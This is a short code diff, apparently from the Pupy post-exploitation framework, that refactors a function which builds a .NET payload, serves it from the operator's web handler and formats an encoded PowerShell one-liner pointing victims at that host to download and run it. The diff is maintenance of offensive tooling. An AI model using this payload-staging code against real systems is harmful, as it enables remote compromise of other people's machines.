@@ -124,13 +124,13 @@ class DotNetPayload(object):
         return outfile
 
 
-def dotnet_serve_payload(display, server, rawdll, conf, link_ip="<your_ip>"):
+def dotnet_serve_payload(display, server, rawdll, conf, link_ip=None):
     if not server:
         display(Error('Oneliners only supported from pupysh'))
         return
 
-    if not server.pupweb:
-        display(Error('Webserver disabled'))
+    if not server.web_handler_enabled:
+        display(Error('Webserver handlers disabled'))
         return
 
     dn = DotNetPayload(display, server, conf, rawdll)
@@ -145,11 +145,14 @@ def dotnet_serve_payload(display, server, rawdll, conf, link_ip="<your_ip>"):
 
     os.unlink(exe_path)
 
-    landing_uri = server.pupweb.serve_content(payload, alias='.NET payload')
+    landing_uri = server.serve_content(payload, alias='.NET payload')
+
+    if link_ip is None:
+        link_ip = server.address
 
     command = PS_TEMPLATE.format(
         link_ip=link_ip,
-        port=server.pupweb.port,
+        port=server.web_handler_port,
         landing_uri=landing_uri
     ).encode('utf-16le')
 
